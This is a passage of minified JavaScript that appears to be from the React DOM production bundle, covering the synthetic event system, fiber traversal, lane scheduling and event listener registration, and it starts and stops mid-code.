n.dangerouslySetInnerHTML))throw Error(P(61))}if(n.style!=null&&typeof n.style!="object")throw Error(P(62))}}function ya(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var va=null;function kl(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var wa=null,Et=null,Tt=null;function Co(e){if(e=Vs(e)){if(typeof wa!="function")throw Error(P(280));var n=e.stateNode;n&&(n=fi(n),wa(e.stateNode,e.type,n))}}function Pu(e){Et?Tt?Tt.push(e):Tt=[e]:Et=e}function Au(){if(Et){var e=Et,n=Tt;if(Tt=Et=null,Co(e),n)for(e=0;e<n.length;e++)Co(n[e])}}function Lu(e,n){return e(n)}function Nu(){}var Mi=!1;function Ru(e,n,t){if(Mi)return e(n,t);Mi=!0;try{return Lu(e,n,t)}finally{Mi=!1,(Et!==null||Tt!==null)&&(Nu(),Au())}}function ws(e,n){var t=e.stateNode;if(t===null)return null;var s=fi(t);if(s===null)return null;t=s[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(P(231,n,typeof t));return t}var ka=!1;if(hn)try{var Yt={};Object.defineProperty(Yt,"passive",{get:function(){ka=!0}}),window.addEventListener("test",Yt,Yt),window.removeEventListener("test",Yt,Yt)}catch{ka=!1}function Mh(e,n,t,s,r,i,a,l,o){var c=Array.prototype.slice.call(arguments,3);try{n.apply(t,c)}catch(u){this.onError(u)}}var cs=!1,Or=null,Mr=!1,ba=null,Ih={onError:function(e){cs=!0,Or=e}};function Dh(e,n,t,s,r,i,a,l,o){cs=!1,Or=null,Mh.apply(Ih,arguments)}function zh(e,n,t,s,r,i,a,l,o){if(Dh.apply(this,arguments),cs){if(cs){var c=Or;cs=!1,Or=null}else throw Error(P(198));Mr||(Mr=!0,ba=c)}}function ot(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Ou(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function Po(e){if(ot(e)!==e)throw Error(P(188))}function jh(e){var n=e.alternate;if(!n){if(n=ot(e),n===null)throw Error(P(188));return n!==e?null:e}for(var t=e,s=n;;){var r=t.return;if(r===null)break;var i=r.alternate;if(i===null){if(s=r.return,s!==null){t=s;continue}break}if(r.child===i.child){for(i=r.child;i;){if(i===t)return Po(r),e;if(i===s)return Po(r),n;i=i.sibling}throw Error(P(188))}if(t.return!==s.return)t=r,s=i;else{for(var a=!1,l=r.child;l;){if(l===t){a=!0,t=r,s=i;break}if(l===s){a=!0,s=r,t=i;break}l=l.sibling}if(!a){for(l=i.child;l;){if(l===t){a=!0,t=i,s=r;break}if(l===s){a=!0,s=i,t=r;break}l=l.sibling}if(!a)throw Error(P(189))}}if(t.alternate!==s)throw Error(P(190))}if(t.tag!==3)throw Error(P(188));return t.stateNode.current===t?e:n}function Mu(e){return e=jh(e),e!==null?Iu(e):null}function Iu(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=Iu(e);if(n!==null)return n;e=e.sibling}return null}var Du=Re.unstable_scheduleCallback,Ao=Re.unstable_cancelCallback,Bh=Re.unstable_shouldYield,Fh=Re.unstable_requestPaint,ne=Re.unstable_now,Uh=Re.unstable_getCurrentPriorityLevel,bl=Re.unstable_ImmediatePriority,zu=Re.unstable_UserBlockingPriority,Ir=Re.unstable_NormalPriority,Hh=Re.unstable_LowPriority,ju=Re.unstable_IdlePriority,ui=null,nn=null;function Vh(e){if(nn&&typeof nn.onCommitFiberRoot=="function")try{nn.onCommitFiberRoot(ui,e,void 0,(e.current.flags&128)===128)}catch{}}var qe=Math.clz32?Math.clz32:Gh,Wh=Math.log,$h=Math.LN2;function Gh(e){return e>>>=0,e===0?32:31-(Wh(e)/$h|0)|0}var Js=64,er=4194304;function rs(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Dr(e,n){var t=e.pendingLanes;if(t===0)return 0;var s=0,r=e.suspendedLanes,i=e.pingedLanes,a=t&268435455;if(a!==0){var l=a&~r;l!==0?s=rs(l):(i&=a,i!==0&&(s=rs(i)))}else a=t&~r,a!==0?s=rs(a):i!==0&&(s=rs(i));if(s===0)return 0;if(n!==0&&n!==s&&!(n&r)&&(r=s&-s,i=n&-n,r>=i||r===16&&(i&4194240)!==0))return n;if(s&4&&(s|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=s;0<n;)t=31-qe(n),r=1<<t,s|=e[t],n&=~r;return s}function Yh(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function qh(e,n){for(var t=e.suspendedLanes,s=e.pingedLanes,r=e.expirationTimes,i=e.pendingLanes;0<i;){var a=31-qe(i),l=1<<a,o=r[a];o===-1?(!(l&t)||l&s)&&(r[a]=Yh(l,n)):o<=n&&(e.expiredLanes|=l),i&=~l}}function xa(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function Bu(){var e=Js;return Js<<=1,!(Js&4194240)&&(Js=64),e}function Ii(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function Us(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-qe(n),e[n]=t}function Xh(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<t;){var r=31-qe(t),i=1<<r;n[r]=0,s[r]=-1,e[r]=-1,t&=~i}}function xl(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var s=31-qe(t),r=1<<s;r&n|e[s]&n&&(e[s]|=n),t&=~r}}var G=0;function Fu(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Uu,Sl,Hu,Vu,Wu,Sa=!1,nr=[],Ln=null,Nn=null,Rn=null,ks=new Map,bs=new Map,_n=[],Kh="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Lo(e,n){switch(e){case"focusin":case"focusout":Ln=null;break;case"dragenter":case"dragleave":Nn=null;break;case"mouseover":case"mouseout":Rn=null;break;case"pointerover":case"pointerout":ks.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":bs.delete(n.pointerId)}}function qt(e,n,t,s,r,i){return e===null||e.nativeEvent!==i?(e={blockedOn:n,domEventName:t,eventSystemFlags:s,nativeEvent:i,targetContainers:[r]},n!==null&&(n=Vs(n),n!==null&&Sl(n)),e):(e.eventSystemFlags|=s,n=e.targetContainers,r!==null&&n.indexOf(r)===-1&&n.push(r),e)}function Qh(e,n,t,s,r){switch(n){case"focusin":return Ln=qt(Ln,e,n,t,s,r),!0;case"dragenter":return Nn=qt(Nn,e,n,t,s,r),!0;case"mouseover":return Rn=qt(Rn,e,n,t,s,r),!0;case"pointerover":var i=r.pointerId;return ks.set(i,qt(ks.get(i)||null,e,n,t,s,r)),!0;case"gotpointercapture":return i=r.pointerId,bs.set(i,qt(bs.get(i)||null,e,n,t,s,r)),!0}return!1}function $u(e){var n=qn(e.target);if(n!==null){var t=ot(n);if(t!==null){if(n=t.tag,n===13){if(n=Ou(t),n!==null){e.blockedOn=n,Wu(e.priority,function(){Hu(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function vr(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=_a(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var s=new t.constructor(t.type,t);va=s,t.target.dispatchEvent(s),va=null}else return n=Vs(t),n!==null&&Sl(n),e.blockedOn=t,!1;n.shift()}return!0}function No(e,n,t){vr(e)&&t.delete(n)}function Zh(){Sa=!1,Ln!==null&&vr(Ln)&&(Ln=null),Nn!==null&&vr(Nn)&&(Nn=null),Rn!==null&&vr(Rn)&&(Rn=null),ks.forEach(No),bs.forEach(No)}function Xt(e,n){e.blockedOn===n&&(e.blockedOn=null,Sa||(Sa=!0,Re.unstable_scheduleCallback(Re.unstable_NormalPriority,Zh)))}function xs(e){function n(r){return Xt(r,e)}if(0<nr.length){Xt(nr[0],e);for(var t=1;t<nr.length;t++){var s=nr[t];s.blockedOn===e&&(s.blockedOn=null)}}for(Ln!==null&&Xt(Ln,e),Nn!==null&&Xt(Nn,e),Rn!==null&&Xt(Rn,e),ks.forEach(n),bs.forEach(n),t=0;t<_n.length;t++)s=_n[t],s.blockedOn===e&&(s.blockedOn=null);for(;0<_n.length&&(t=_n[0],t.blockedOn===null);)$u(t),t.blockedOn===null&&_n.shift()}var Ct=vn.ReactCurrentBatchConfig,zr=!0;function Jh(e,n,t,s){var r=G,i=Ct.transition;Ct.transition=null;try{G=1,_l(e,n,t,s)}finally{G=r,Ct.transition=i}}function ef(e,n,t,s){var r=G,i=Ct.transition;Ct.transition=null;try{G=4,_l(e,n,t,s)}finally{G=r,Ct.transition=i}}function _l(e,n,t,s){if(zr){var r=_a(e,n,t,s);if(r===null)$i(e,n,s,jr,t),Lo(e,s);else if(Qh(r,e,n,t,s))s.stopPropagation();else if(Lo(e,s),n&4&&-1<Kh.indexOf(e)){for(;r!==null;){var i=Vs(r);if(i!==null&&Uu(i),i=_a(e,n,t,s),i===null&&$i(e,n,s,jr,t),i===r)break;r=i}r!==null&&s.stopPropagation()}else $i(e,n,s,null,t)}}var jr=null;function _a(e,n,t,s){if(jr=null,e=kl(s),e=qn(e),e!==null)if(n=ot(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Ou(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return jr=e,null}function Gu(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Uh()){case bl:return 1;case zu:return 4;case Ir:case Hh:return 16;case ju:return 536870912;default:return 16}default:return 16}}var Cn=null,El=null,wr=null;function Yu(){if(wr)return wr;var e,n=El,t=n.length,s,r="value"in Cn?Cn.value:Cn.textContent,i=r.length;for(e=0;e<t&&n[e]===r[e];e++);var a=t-e;for(s=1;s<=a&&n[t-s]===r[i-s];s++);return wr=r.slice(e,1<s?1-s:void 0)}function kr(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function tr(){return!0}function Ro(){return!1}function Ie(e){function n(t,s,r,i,a){this._reactName=t,this._targetInst=r,this.type=s,this.nativeEvent=i,this.target=a,this.currentTarget=null;for(var l in e)e.hasOwnProperty(l)&&(t=e[l],this[l]=t?t(i):i[l]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?tr:Ro,this.isPropagationStopped=Ro,this}return J(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=tr)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=tr)},persist:function(){},isPersistent:tr}),n}var Ht={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Tl=Ie(Ht),Hs=J({},Ht,{view:0,detail:0}),nf=Ie(Hs),Di,zi,Kt,pi=J({},Hs,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Cl,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Kt&&(Kt&&e.type==="mousemove"?(Di=e.screenX-Kt.screenX,zi=e.screenY-Kt.screenY):zi=Di=0,Kt=e),Di)},movementY:function(e){return"movementY"in e?e.movementY:zi}}),Oo=Ie(pi),tf=J({},pi,{dataTransfer:0}),sf=Ie(tf),rf=J({},Hs,{relatedTarget:0}),ji=Ie(rf),af=J({},Ht,{animationName:0,elapsedTime:0,pseudoElement:0}),lf=Ie(af),of=J({},Ht,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),cf=Ie(of),uf=J({},Ht,{data:0}),Mo=Ie(uf),pf={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},df={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},hf={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function ff(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=hf[e])?!!n[e]:!1}function Cl(){return ff}var mf=J({},Hs,{key:function(e){if(e.key){var n=pf[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=kr(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?df[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Cl,charCode:function(e){return e.type==="keypress"?kr(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?kr(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),gf=Ie(mf),yf=J({},pi,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Io=Ie(yf),vf=J({},Hs,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Cl}),wf=Ie(vf),kf=J({},Ht,{propertyName:0,elapsedTime:0,pseudoElement:0}),bf=Ie(kf),xf=J({},pi,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Sf=Ie(xf),_f=[9,13,27,32],Pl=hn&&"CompositionEvent"in window,us=null;hn&&"documentMode"in document&&(us=document.documentMode);var Ef=hn&&"TextEvent"in window&&!us,qu=hn&&(!Pl||us&&8<us&&11>=us),Do=" ",zo=!1;function Xu(e,n){switch(e){case"keyup":return _f.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Ku(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var ht=!1;function Tf(e,n){switch(e){case"compositionend":return Ku(n);case"keypress":return n.which!==32?null:(zo=!0,Do);case"textInput":return e=n.data,e===Do&&zo?null:e;default:return null}}function Cf(e,n){if(ht)return e==="compositionend"||!Pl&&Xu(e,n)?(e=Yu(),wr=El=Cn=null,ht=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return qu&&n.locale!=="ko"?null:n.data;default:return null}}var Pf={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function jo(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!Pf[e.type]:n==="textarea"}function Qu(e,n,t,s){Pu(s),n=Br(n,"onChange"),0<n.length&&(t=new Tl("onChange","change",null,t,s),e.push({event:t,listeners:n}))}var ps=null,Ss=null;function Af(e){op(e,0)}function di(e){var n=gt(e);if(bu(n))return e}function Lf(e,n){if(e==="change")return n}var Zu=!1;if(hn){var Bi;if(hn){var Fi="oninput"in document;if(!Fi){var Bo=document.createElement("div");Bo.setAttribute("oninput","return;"),Fi=typeof Bo.oninput=="function"}Bi=Fi}else Bi=!1;Zu=Bi&&(!document.documentMode||9<document.documentMode)}function Fo(){ps&&(ps.detachEvent("onpropertychange",Ju),Ss=ps=null)}function Ju(e){if(e.propertyName==="value"&&di(Ss)){var n=[];Qu(n,Ss,e,kl(e)),Ru(Af,n)}}function Nf(e,n,t){e==="focusin"?(Fo(),ps=n,Ss=t,ps.attachEvent("onpropertychange",Ju)):e==="focusout"&&Fo()}function Rf(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return di(Ss)}function Of(e,n){if(e==="click")return di(n)}function Mf(e,n){if(e==="input"||e==="change")return di(n)}function If(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Ke=typeof Object.is=="function"?Object.is:If;function _s(e,n){if(Ke(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),s=Object.keys(n);if(t.length!==s.length)return!1;for(s=0;s<t.length;s++){var r=t[s];if(!aa.call(n,r)||!Ke(e[r],n[r]))return!1}return!0}function Uo(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Ho(e,n){var t=Uo(e);e=0;for(var s;t;){if(t.nodeType===3){if(s=e+t.textContent.length,e<=n&&s>=n)return{node:t,offset:n-e};e=s}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=Uo(t)}}function ep(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?ep(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function np(){for(var e=window,n=Rr();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=Rr(e.document)}return n}function Al(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function Df(e){var n=np(),t=e.focusedElem,s=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&ep(t.ownerDocument.documentElement,t)){if(s!==null&&Al(t)){if(n=s.start,e=s.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var r=t.textContent.length,i=Math.min(s.start,r);s=s.end===void 0?i:Math.min(s.end,r),!e.extend&&i>s&&(r=s,s=i,i=r),r=Ho(t,i);var a=Ho(t,s);r&&a&&(e.rangeCount!==1||e.anchorNode!==r.node||e.anchorOffset!==r.offset||e.focusNode!==a.node||e.focusOffset!==a.offset)&&(n=n.createRange(),n.setStart(r.node,r.offset),e.removeAllRanges(),i>s?(e.addRange(n),e.extend(a.node,a.offset)):(n.setEnd(a.node,a.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var zf=hn&&"documentMode"in document&&11>=document.documentMode,ft=null,Ea=null,ds=null,Ta=!1;function Vo(e,n,t){var s=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;Ta||ft==null||ft!==Rr(s)||(s=ft,"selectionStart"in s&&Al(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),ds&&_s(ds,s)||(ds=s,s=Br(Ea,"onSelect"),0<s.length&&(n=new Tl("onSelect","select",null,n,t),e.push({event:n,listeners:s}),n.target=ft)))}function sr(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var mt={animationend:sr("Animation","AnimationEnd"),animationiteration:sr("Animation","AnimationIteration"),animationstart:sr("Animation","AnimationStart"),transitionend:sr("Transition","TransitionEnd")},Ui={},tp={};hn&&(tp=document.createElement("div").style,"AnimationEvent"in window||(delete mt.animationend.animation,delete mt.animationiteration.animation,delete mt.animationstart.animation),"TransitionEvent"in window||delete mt.transitionend.transition);function hi(e){if(Ui[e])return Ui[e];if(!mt[e])return e;var n=mt[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in tp)return Ui[e]=n[t];return e}var sp=hi("animationend"),rp=hi("animationiteration"),ip=hi("animationstart"),ap=hi("transitionend"),lp=new Map,Wo="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Un(e,n){lp.set(e,n),lt(n,[e])}for(var Hi=0;Hi<Wo.length;Hi++){var Vi=Wo[Hi],jf=Vi.toLowerCase(),Bf=Vi[0].toUpperCase()+Vi.slice(1);Un(jf,"on"+Bf)}Un(sp,"onAnimationEnd");Un(rp,"onAnimationIteration");Un(ip,"onAnimationStart");Un("dblclick","onDoubleClick");Un("focusin","onFocus");Un("focusout","onBlur");Un(ap,"onTransitionEnd");Rt("onMouseEnter",["mouseout","mouseover"]);Rt("onMouseLeave",["mouseout","mouseover"]);Rt("onPointerEnter",["pointerout","pointerover"]);Rt("onPointerLeave",["pointerout","pointerover"]);lt("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));lt("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));lt("onBeforeInput",["compositionend","keypress","textInput","paste"]);lt("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));lt("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));lt("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var is="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Ff=new Set("cancel close invalid load scroll toggle".split(" ").concat(is));function $o(e,n,t){var s=e.type||"unknown-event";e.currentTarget=t,zh(s,n,void 0,e),e.currentTarget=null}function op(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var s=e[t],r=s.event;s=s.listeners;e:{var i=void 0;if(n)for(var a=s.length-1;0<=a;a--){var l=s[a],o=l.instance,c=l.currentTarget;if(l=l.listener,o!==i&&r.isPropagationStopped())break e;$o(r,l,c),i=o}else for(a=0;a<s.length;a++){if(l=s[a],o=l.instance,c=l.currentTarget,l=l.listener,o!==i&&r.isPropagationStopped())break e;$o(r,l,c),i=o}}}if(Mr)throw e=ba,Mr=!1,ba=null,e}function q(e,n){var t=n[Na];t===void 0&&(t=n[Na]=new Set);var s=e+"__bubble";t.has(s)||(cp(n,e,2,!1),t.add(s))}function Wi(e,n,t){var s=0;n&&(s|=4),cp(t,e,s,n)}var rr="_reactListening"+Math.random().toString(36).slice(2);function Es(e){if(!e[rr]){e[rr]=!0,gu.forEach(function(t){t!=="selectionchange"&&(Ff.has(t)||Wi(t,!1,e),Wi(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[rr]||(n[rr]=!0,Wi("selectionchange",!1,n))}}function cp(e,n,t,s){switch(Gu(n)){case 1:var r=Jh;break;case 4:r=ef;break;default:r=_l}t=r.bind(null,n,t,e),r=void 0,!ka||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(r=!0),s?r!==void 0?e.addEventListener(n,t,{capture:!0,passive:r}):e.addEventListener(n,t,!0):r!==void 0?e.addEventListener(n,t,{passive:r}):e.addEventListener(n,t,!1)}function $i(e,n,t,s,r){var i=s;if(!(n&1)&&!(n&2)&&s!==null)e:for(;;){if(s===null)return;var a=s.tag;if(a===3||a===4){var l=s.stateNode.containerInfo;if(l===r||l.nodeType===8&&l.parentNode===r)break;if(a===4)for(a=s.return;a!==null;){var o=a.tag;if((o===3||o===4)&&(o=a.stateNode.containerInfo,o===r||o.nodeType===8&&o.parentNode===r))return;a=a.return}for(;l!==null;){if(a=qn(l),a===null)return;if(o=a.tag,o===5||o===6){s=i=a;continue e}l=l.parentNode}}s=s.return}Ru(function(){var c=i,u=kl(t),d=[];e:{var h=lp.get(e);if(h!==void 0){var v=Tl,k=e;switch(e){case"keypress":if(kr(t)===0)break e;case"keydown":case"keyup":v=gf;break;case"focusin":k="focus",v=ji;break;case"focusout":k="blur",v=ji;break;case"beforeblur":case"afterblur":v=ji;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=Oo;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=sf;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=wf;break;case sp:case rp:case ip:v=lf;break;case ap:v=bf;break;case"scroll":v=nf;break;case"wheel":v=Sf;break;case"copy":case"cut":case"paste":v=cf;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=Io}var x=(n&4)!==0,A=!x&&e==="scroll",p=x?h!==null?h+"Capture":null:h;x=[];for(var f=c,m;f!==null;){m=f;var S=m.stateNode;if(m.tag===5&&S!==null&&(m=S,p!==null&&(S=ws(f,p),S!=null&&x.push(Ts(f,S,m)))),A)break;f=f.return}0<x.length&&(h=new v(h,k,null,t,u),d.push({event:h,listeners:x}))}}if(!(n&7)){e:{if(h=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",h&&t!==va&&(k=t.relatedTarget||t.fromElement)&&(qn(k)||k[fn]))break 